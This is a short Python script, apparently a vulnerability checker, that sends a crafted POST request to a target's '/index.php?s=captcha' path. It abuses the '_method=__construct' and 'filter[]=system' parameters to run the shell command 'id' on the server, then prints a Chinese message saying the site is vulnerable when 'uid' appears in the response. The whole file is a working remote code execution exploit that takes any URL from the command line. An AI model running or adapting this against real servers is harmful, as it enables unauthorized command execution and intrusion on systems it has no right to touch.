#coding:utf-8
import requests
import sys
def request(url):
    path = url+'/index.php?s=captcha'
    headers = {
        'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    post_data={'_method':'__construct',
               'filter[]':'system',
               'method':'get',
               'server[REQUEST_METHOD]':'id'
               }
    resp = requests.post(path,headers=headers,data=post_data)
    resp_text = resp.content
    # with open("1.txt","wb") as f:
    #     f.write(resp_text)
    if 'uid' in resp_text.decode():
        print(url+":存在漏洞")

if __name__ == '__main__':
 args = sys.argv
 if len(args) == 2:
     url = args[1]
     request(url)

